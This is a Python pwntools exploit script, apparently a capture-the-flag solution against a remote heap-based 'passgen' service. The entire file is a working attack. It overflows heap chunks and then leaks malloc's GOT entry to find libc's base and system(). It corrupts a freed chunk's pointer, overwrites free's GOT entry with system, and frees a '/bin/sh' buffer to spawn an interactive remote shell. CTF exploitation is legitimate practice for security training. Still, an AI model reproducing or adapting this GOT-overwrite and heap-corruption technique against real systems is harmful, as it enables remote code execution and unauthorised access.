from pwn import *
import time
import sys


freegot = 0x0804B018
mallocgot = 0x0804B028
listnote = 0x0804B1C0
count = 0x0804B1AC
atoigot = 0x0804B040

def Add(name, nameLength, passLength):
    r.sendline("1")
    r.recvuntil("Enter your username's length: ")
    r.sendline(str(nameLength))
    r.recvuntil("Enter your desired password length: ")
    r.sendline(str(passLength))
    r.recvuntil("Enter your username: ")
    r.send(name)
    res = r.recvuntil("Menu:")
    r.recvuntil("Your choice: ")
    return res
def Edit(idx, name):
    r.sendline("2")
    r.recvuntil("Account ID: ")
    r.sendline(str(idx))
    r.recvuntil("Enter your new username: ")
    r.send(name)
    r.recvuntil("Done!\n")
    res = r.recvuntil("Your choice: ")
    return res
def Delete(idx):
    r.sendline("3")
    r.recvuntil("Account ID: ")
    r.sendline(str(idx))
    res = r.recvuntil("Your choice: ")
    return res  
def View(idx):
    r.sendline("4")
    r.recvuntil("Account ID: ")
    r.sendline(str(idx))
    res = r.recvuntil("Menu:")
    r.recvuntil("Your choice: ")
    return res
def List():
    r.sendline("5")
    res = r.recvuntil("Menu:")
    r.recvuntil("Your choice: ")
    return res
def GenPass(idx):
    r.sendline("6")
    r.recvuntil("Account ID: ")
    r.sendline(str(idx))
    res = r.recvuntil("Menu:")
    r.recvuntil("Your choice: ")
    return res
def RegenPass(idx):
    r.sendline("7")
    r.recvuntil("Account ID: ")
    r.sendline(str(idx))
    res = r.recvuntil("Menu:")
    r.recvuntil("Your choice: ")
    return res
def Exit():
    r.sendline("0")
    
# r = process("./passgen")
offset_main_arena = 0x3c4af0
offset_one_gadget = 0xf1117
# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
libc = ELF('libc.so')
r = remote('bak.passgen.grandprix.whitehatvn.com', 4599)
# gdb.attach(r, "b*0x080490B7")
r.recvuntil("Your choice: ")
for i in range(0x39):
    Add("A"*0x16, 0x16, 40)
Add("A"*0x16, 0x16, 40) # 0x39
GenPass(0x39)
Add("B"*0x10, 0x10, 0x10) # 0x3a
RegenPass(0x39)
Add("C"*0xc, 0xc, 0x20) # 3b
Add("C"*0xc, 0xc, 0x20) # 3c
Add("C"*4, 4, 8) # 3d
Add("C"*4, 4, 8) # 3e
payload = "a"*0x24
payload += p32(0xff)*2
payload += p32(mallocgot)
payload += "\n"
Edit(0x3a, payload)
tmp = View(0x3b)
malloc = u32(tmp.split('Password pronunciation: ')[-1][:4])
log.info("malloc: %#x" %malloc)
base = malloc - libc.symbols['malloc']
system = base + libc.symbols['system']
log.info("base: %#x" %base)
log.info("system: %#x" %system)
payload = "a"*0x1c
payload += p32(0)+p32(0x41)
payload += p32(0xff)*2
payload += p32(0)
payload += "\n"
Edit(0x3a, payload)
Delete(0x3b)
payload = "a"*0x1c
payload += p32(0)+p32(0x41)
payload += p32(count-4)
payload += "\n"
Edit(0x3a, payload)
Add("C"*0xc, 0xc, 0x20) # 3f
payload = "a"*4 #padding
payload += "/bin/sh\x00" #0-1
payload += p32(freegot-0xc) #2
payload += p32(0x804b1c0) #3
payload += "\n"
Add(payload, 0x20, 0xc) # 40
Edit(2, p32(system)+"\n")
r.sendline("3")
r.recvuntil("Account ID: ")
r.sendline(str(3))
r.interactive()
